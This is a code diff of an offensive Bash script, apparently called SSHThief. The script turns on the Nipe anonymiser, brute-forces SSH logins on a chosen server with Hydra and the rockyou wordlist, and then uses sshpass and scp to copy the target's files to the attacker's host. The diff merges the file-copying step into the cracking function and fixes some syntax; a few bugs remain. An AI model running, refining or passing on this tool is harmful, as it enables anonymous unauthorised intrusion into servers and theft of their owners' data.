@@ -6,8 +6,7 @@
 
 # INSTALL(): automatically installs relevant applications on user host and creates relevant directories
 # ANON(): executes Nipe anonymiser and conducts an anonymity check
-# SSHCRACK(): collects user input for VPS address and executes a hydra brute-force attack
-# SCP(): access VPS, and secure copy (scp) all the directories and files from the VPS onto the local host
+# SSHCRACK(): collects user input for VPS address, executes a hydra brute-force attack and copies target system onto local host
 
 #####################
 ### INSTALL FUNCTION
@@ -72,33 +71,6 @@ function INSTALL()
 ### EXECUTION
 INSTALL
 
-########
-### SCP
-########
-
-### DEFINITION
-function SCP()
-{
-	### START
-	echo " "
-	echo "[+] Connected to $vpsip."
-	echo " "
-	echo "[*] Copying target file system..."
-	echo " "
-	# create directory to store file system
-	cd ~/SSHThief/$vpsip
-	mkdir ~/SSHThief/$vpsip/system
-	cd ~/SSHThief/$vpsip/system
-	
-	### ACCESS AND COPY
-	sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/* ~/SSHThief/$vpsip/system 2> /dev/null
-	echo " "
-	echo "[+] Target file system has been copied onto the directory: ~/SSHThief/$vpsip/system"
-	
-	### END
-	exit
-}
-
 #############
 ### SSHCRACK
 #############
@@ -124,27 +96,24 @@ function SSHCRACK()
 	echo "[+] Directory created: ~/SSHThief/$vpsip"
 	echo " "
 	
-	# WORDLIST CONFIGURATION
+	### WORDLIST CONFIGURATION
 	echo "[*] Configuring Wordlists..."
-	cd ~/SSHThief/$vpsip
-	mkdir wordlist
-	cd ~/usr/share/wordlists
-	sudo gunzip rockyou.txt
-	sudo cat rockyou.txt > wordlist.txt
-	sudo sed -i '1i root' wordlist.txt
-	sudo mv wordlist.txt ~/SSHThief/$vpsip/wordlist
-	cd ~/SSHThief/$vpsip/wordlist
-	WordList=~/SSHThief/$vpsip/wordlist/wordlist.txt
-	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist/wordlist.txt"
 	echo " "
-	cd ~/SSHThief
+	cd /usr/share/wordlists
+	sudo gunzip rockyou.txt.gz
+	sudo cp rockyou.txt ~/SSHThief/$vpsip/wordlist.txt
+	cd ~/SSHThief/$vpsip
+	sudo sed -i '1i kali' wordlist.txt
+	WordList=~/SSHThief/$vpsip/wordlist.txt
+	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist.txt"
+	echo " "
 	
 	### BRUTE-FORCE ATTACK
 	echo "[*] Executing Hydra Brute-Force Attack via SSH protocol..."  
 	echo " "
 	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
 	# if attack succeeds, select cracked user and call the SCP function
-	crackstatus = $(cat crackedusers.txt | grep host: | awk '{print $2}')
+	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
 	
 	if [ "$crackstatus" == "host:" ]
 	then
@@ -156,13 +125,25 @@ function SSHCRACK()
 		echo " "
 		
 		### SELECTION OF CRACKED USER
-		read -p "[!] Enter the cracked user you want to access as:" $vpsuser
+		read -p "[!] Enter the cracked user you want to access as: " $vpsuser
 		echo " "
 		readp -p "[!] Enter the password of the cracked user: " $vpspass
 		echo " "
 		echo "[*] Connecting to $vpsip now..."
-		# execute SCP function
-		SCP
+		
+		# SCP OF SYSTEM FILES
+		echo " "
+		echo "[+] Connected to $vpsip."
+		echo " "
+		echo "[*] Copying target file system..."
+		echo " "
+		sshpass -p "$vpspass" scp "$vpsuser"@"$vpsip":~/* ~/SSHThief/$vpsip 2> /dev/null
+		echo " "
+		echo "[+] Target file system has been copied onto the directory: ~/SSHThief/$vpsip/system"
+	
+	### END
+	exit
+		
 	else
 		### EXIT
 		echo "[-] Attack unsuccessful. Exiting program now..."
@@ -194,6 +175,7 @@ function ANON()
 	sudo perl nipe.pl status
 	# if nipestatus shows "activated", user is anonymous
 	nipestatus="$(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')"
+	
 	if [ "$nipestatus" == "activated" ]
 	then
 		### PROCEED
@@ -202,6 +184,7 @@ function ANON()
 		echo " "
 		# after anonymity check, call the SSHCRACK function
 		SSHCRACK
+		
 	else
 		### EXIT
 		echo " "
@@ -210,9 +193,9 @@ function ANON()
 		echo "[-] Error in activating nipe. Exiting now..."
 		echo " "
 		exit
+		
 	fi	
 }
 
 # EXECUTION
 ANON
-
